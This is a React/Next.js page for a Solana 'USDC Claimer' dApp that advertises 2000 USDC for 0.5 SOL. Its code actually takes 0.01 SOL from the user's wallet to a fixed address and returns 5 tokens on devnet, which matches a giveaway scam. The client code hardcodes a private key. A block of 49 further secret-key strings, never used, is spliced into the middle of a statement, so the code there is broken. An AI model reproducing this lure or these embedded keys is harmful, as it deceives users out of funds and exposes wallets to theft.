/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4VfyZUTvYvtLTbVEHFrxEdifXYu5hDt7doi2i5XpUUMhVcWLNiVDStbN5xD9z81YFB7B8vnCrLG7gSwLt7As59bc"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4sbKQyrjkPSVPagraqARs1GyATxBwwwikYHwJgiEFZrkvsQyNm4dSb2WvrTQvhxyuXey9qiLRpUV4qqCop6RvNgt",
  "key1": "2gBP6gkKB4TkyrMpyC8jE36NQNwzyQZkfMbfqy627HsQKRSnojPbEUULwnSW9UuxBiPgcegBpEEkRqRqbJQXU99d",
  "key2": "5phYykAJwuMkd4N6tXiHQjX7H7EprXctS45xAf7rwQCUdojEQ5QLTa5g67ZXp7Btp5ZaLxjSbzHWNtDdfQ3mqy7w",
  "key3": "3GRSsw1S6c9x7qbUCWe5GrRW5kb2V2ZiuEEfWa9hgvV5k3V5GE3wPkqnLrVkTdrgfR44Q9YHQ75YCih8RdhhnnTt",
  "key4": "RVGBFpqiyfcQMrUgzPFaFtqpwKAXh5jAgFFvGNsqRku35MUKVWUD1SARznEBzZvXssLXTSsuAAsJRWbSxYJErBb",
  "key5": "4CBc1yMWGDrZcx6EDVHrUBtCnAVZniNG9vGk82wLykiQ2HyyD6TTwwubheHHuqdNVMSF9rcN9ogx3UXihVZSnYvN",
  "key6": "2WXJZbu9uBMybrqZj5i9QCqFQ3wcHadCBVQ2qPsbXDtjxUHghFhixzfq8bhZRayVKLHDivZ5TmJ9Qz5JGenQsXCL",
  "key7": "5zjqPEvAjdEfyU93bpkMfiAQUBDirv1J9ioQNSbNrpQ7HaaLGaxtVywSoyWMLgB3gcHC5TKhE2SMAfNVWUzpNrW5",
  "key8": "563Ud5XwNNDukahxnNEVKDHZ8yKaSLHgaxAw7osYZzWSSr6H85zitJSYpTmJZX9LjHTT4E6vzoY8cWZZJBHu8vQk",
  "key9": "GLnzenbwZexCp4gB3UHwjZQEwkTXLtCjD7DRKKiHbcTeotxZnmAg3P4UmQiH2xUwgJxfeKHKa5mMD8U2Ls565sa",
  "key10": "5HdoPkM1QgBxNp8vfGoEEfMyi8Za5Mw5gtyWqfQVDuyd9Fx9i5LKpiwxPGN2yzhtQpnpR1i5aBAs7u222PkSEZJp",
  "key11": "4SmGWJMxZmBJJDvqbC33aYTRbuh6ppfS9465vfPHJZF1CZ98rEkAD9b8vLWrW1WRH3pYQmZj5petzyURhZ3kxe11",
  "key12": "AL3U9kmbwhT1EWJABVivHrJuv8FaHF8iG2CVc9DUMUXkRdRnTr95zvP3EZzmbyx2ym7fSVPUjLdUfCmkRMMvx9U",
  "key13": "43ppdUS1N2RYpxCvdANWUQm5UuyeQ55HmFU97Rv3UA1B4wdPgUUEhgwMNPYtrgg4tXznFSrQRJ5goNTvLgeDCRb3",
  "key14": "3S8jgSarZcxWgoieBNz6iygjS5q1dqtkmfTN3xLvE4sjeRMSxY5mGUSswmytH9aH2qcaTZkXmgpB2azvfoq4ncqB",
  "key15": "t4bo2G5kZJjhkQSzW6WY4BCYvkLU8BPMkxR3eZX1d3Pfy8JdR3kw3jF1SU7Fpqpu29emMXfqX45iH9VTr2NgPLd",
  "key16": "42BNake6AJgZDzcswvyEYUbb65QnvyM8nT2Kz2mmZfjkfWXE8JVdBxxGC482nX219gmpG3EbMNy5gdGqA2ENqX59",
  "key17": "2WddVMvVQXaEoKD6tFXnKnt9WAsqBCjFo24Zk3t3LosACHHhaAeEgHaoUxjWPeWZW6wtA8QhRp27uULj7SrRARHh",
  "key18": "4q4ZVGPHJABYrJhejkZdW3pFFQFt6fByDHq1waGGRMa7oQ6Sn4CDk2eFjTpamMehVGq5AKN6n7uQPQs5u9HoRXpG",
  "key19": "4EWYQ688zF7qvboGsaEg98w6AxpPYMHH2PoXYuy1vQ94C3x63TmaPGpxQGjbzLKkaEBQ6CSJdKCgFPzisZKgZZ2K",
  "key20": "wSYaMzXFVmcohU63Z7PAPizrZcusguCbyaEUTbhrEpdUfkiHkdyVmxLmXW2dSKVGmZrW7iPYRFyu4Xhg4jnZzwo",
  "key21": "4AeqeeJoqsB7Z7TuawJRQrF9tDL4xfJFb9KCmaTKa1D4RpNkp4FPsXjieYZdRoTy6bygaDsuxBpyTTcTauSVg1SS",
  "key22": "QUgMtPBnpqLbTieGMw5oQ6WtLbYhEu93Y6LUnByxrFaahq5mroo4KXJXwYaW3TdKq5VXCCCtaXySJTUD9Ehqyho",
  "key23": "28UFh221wPiNsKAA84foLXEuxW5bK6z92f8Jxu9ymKkuicomFt42s9yTE9geRhNxApkNiTLxPvCXznJCxUsgKVFQ",
  "key24": "2ML5otn8NFiQdfLLNXSzjSzsnWQCdGxmNfhboEX6pTxXz4Wxde44tr4oS2N7bc47hsm1JYemg7fZuXHBkUYowjyW",
  "key25": "EppLdLaaSKTd1xmcBxbXNhR6Uxnx4oJc6L2wUkLpG2hm5xi2ofbMEcSqsDzaPkxBaR7ToJ9Zwj5BW6zBajbwMWD",
  "key26": "2TkBrnczo1A4T6aMm6cAEYeWKgvyyjyiKXLvuZpSJNiYymJRQ9zJhPXHpTGnudAszq2yXNW4fY5NyFkVZTbuBYfj",
  "key27": "5cScTVqW3gxF1utSsR8YFbjENnaBCvCpibX2DiNJm4X5MKWeZH7UuR4F8ne7nWTKk7tQisnN3PWdJNDV2KQt5orY",
  "key28": "mDz8bUGbaUr2ExvmsedoEmfVZQsm7GiNZDgGg4UHfSbQ5nMJ8THRWY8gDsuG9wbaypeV8ZAtFCLWpZ9Bbg57Trt",
  "key29": "344hMgakqF1KMYcLFPGEV5534MyfednVmdajZwqj5e8Hyf7rzWEKhbJWxCYmP8sL4ihr55B3JpwbRWKCxV7E1bN8",
  "key30": "4GRSbxovazUxeLXBaoGKowm1yUc7Yc5B9xNsRD1kaFQ1wXGzBpeubyXRaoNqUAUgYmuKrYS6WyBXXRzVi9EMwcBY",
  "key31": "2ep7P2vA7EKyU5KZSBmKURie8W95iqwSj5JJNnLqTCtxmZrAkJX2LX22v3bJRSQzzdXxieTXHC43c8tCbG9b68uh",
  "key32": "5hXoVFj9MwWY7yUg8AGLHkZs6XxnzhBqj3Yr69uFUhvh8Fm3bymynkrEXKJdo5ZZNqg5mvnbLNML74WpJke5y8q1",
  "key33": "4AtMm8BHzwKa5gtt8sor6ZbxTRGKYg6wVzNvEbJavw7qdAjRD4ahRBtp6njDRnvHKX6xmxvuS7QGVQHJ3sALAGmT",
  "key34": "MJSdQJAvUp5SpE2w72zkMrM7PnxpBnayihGBErN2GGj41JFKBrtf7g7ths64jASDZ1zQjWpyk5w5psS74RQ1MPE",
  "key35": "3Atw8BScT94CPyZp9xAAxV4vvyfdrVAXpe9XApAZFTU5xmr3tuTSfHdmjPaquZ4uz4kKzFzyEsqo1w8jBiNhL2cC",
  "key36": "3oMXRP1SSmrTpceRSheVN2NFGcwcbdpjERHQReWZxAoQFaCeRzJZgU1chsumy4fs2WF7Ut8KyeSAfqg4QDmZ5FaP",
  "key37": "3rWE4LFG6p9bACGYi3zR13x8jvboHE1N5L6dwf16JJzgZMMkWoGuUkE8z7ggaf4s6NyCEdgCuq4pySLB4HwbwXGD",
  "key38": "mL7D9MYQn3unKrkePhXmqA5HnHxutGhHsWHS8zFP5Qw6gfQqCMuW4FtATSh6EJeWz25NzrKicB4SHfziA8a2kmT",
  "key39": "5XDn84LXpPHz74qYM1fQjzkCHPzZqooEz3d6tjicA17CkqXYcMpqU7RXEgLGZSgT82tcLp4PfZ34fyfnmpnJsXeW",
  "key40": "3mUPDHBnrqA9ceyzvd9PLZDHg63buVmSf86TJmzLQGtvEVPJvKncRUwpUXtjegTabiwYmW1rEok4eUot61RMw25S",
  "key41": "5bakTEGDKhG1Uk1HtX1g89SuYcar5g1d7w5sd8yMSHsDAxxJKJNpUUXJEdT4hdwpvBhCrHTB58bhp6nhRV6Q6dCe",
  "key42": "4FbxB9po5WWFjjs9T6YGZcyhn1YpiKpSW7y5YHmMHduYhfye421morfAnh2m9tb19HxR9ZTnmDASJBzeTqfh4HLB",
  "key43": "4XjnL6tGh9Q4xnS6dDqFKpCeZDSMN51BiM5GKccMxHxdaVnrqQLpvwCZTP7wY6J9GGQbg1ziCatD7bvo9PzSK3pB",
  "key44": "4biius47uHGobGZBCwiFNdwoQazcaqFkcCJxXimGLjd1gCBmwCGFiBrzo3ukrP1qPYNuRm48TrzGULc217EWe7ux",
  "key45": "t21xdcJNvtbZtdsCXGL49kTeYTz2MX9bHymctBrKu2GYAvPaCugh6cuZAnMu3rXum9MHkECohdEWjrWNVPLSWhF",
  "key46": "5uiEf2tehcy9sjYR9wSacJ7udhhWCQ22rcFCkf778q5QAzWWGxDj5t2GWutLeW9WjKjvcjjwEfNfsnwhk5yrbSmx",
  "key47": "52Rwq4jspW79YKauzQcqk4xfaqZRnk6kMmatQQ1X8t57pX3dATzhzaj731959RYTNECvCgwBAXaa83Z8iTjdtLH6",
  "key48": "5TiphH7cGm2iP7jAGoE5eUd7433H26BSZL4xFbyLkP7iX55LQiGwGv8WY6ZWLYexW7dTDhJBaAYBoxVeD9F9YWFB"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
